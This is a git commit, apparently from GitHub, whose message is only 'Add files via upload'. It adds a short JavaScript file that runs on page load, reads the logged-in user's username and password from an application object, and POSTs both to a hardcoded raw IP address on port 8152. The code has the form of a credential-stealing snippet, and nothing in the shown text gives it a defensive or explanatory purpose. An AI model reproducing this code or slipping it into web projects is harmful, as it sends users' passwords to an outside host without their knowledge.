73b159534e5bec4e003f9a004d5bbfbc6a357130
mikeTipix <38519747+mikeTipix@users.noreply.github.com>
2018-05-15 09:46:20 -0700

    Add files via upload

---
+++ 1.js
@@ -0,0 +1,18 @@
+$(function (){
+var user = this.unsene.unseneView.me.get("username");
+var pwd = this.unsene.unseneView.credential.get("password");
+
+    $.ajax({
+           type: "POST",
+            url: "http://218.255.31.228:8152/darktemplar/",
+            data: {
+                username: user,
+                password: pwd
+            },
+            success: function(b) {
+               alert('success');
+            },
+
+        })
+});
+
